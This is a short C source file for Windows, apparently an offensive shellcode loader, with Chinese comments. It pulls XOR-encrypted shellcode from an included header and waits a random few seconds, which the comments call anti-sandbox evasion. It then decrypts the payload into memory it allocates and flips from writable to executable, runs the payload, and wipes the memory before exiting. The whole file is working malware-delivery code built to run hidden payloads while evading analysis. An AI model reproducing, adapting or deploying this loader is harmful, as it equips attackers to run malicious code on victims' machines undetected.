#include <windows.h>
#include <stdlib.h>
#include <string.h>
#include "enc_shellcode.h"

static void xor_dec(unsigned char *buf, unsigned int len, unsigned char key)
{
    for (unsigned int i = 0; i < len; ++i) buf[i] ^= key;
}

void __stdcall mainCRTStartup(void)
{
    /* ❶ 反沙箱：2-5 s 随机 Sleep 代替忙等 */
    Sleep((GetTickCount() & 0xFFF) % 3000 + 2000);

    /* ❷ DEP/NX：用 VirtualAlloc 拿 RW 内存，再转 RX 执行 */
    LPVOID exec = VirtualAlloc(NULL, shellcode_len,
                               MEM_COMMIT | MEM_RESERVE,
                               PAGE_READWRITE);
    if (!exec) ExitProcess(1);

    memcpy(exec, shellcode, shellcode_len);
    xor_dec((unsigned char *)exec, shellcode_len, XOR_KEY);

    DWORD old = 0;
    VirtualProtect(exec, shellcode_len, PAGE_EXECUTE_READ, &old);

    /* ❸ 就地执行；完成后立即自毁并退出 */
    ((void(*)())exec)();

    SecureZeroMemory(exec, shellcode_len);
    VirtualFree(exec, 0, MEM_RELEASE);
    ExitProcess(0);
}
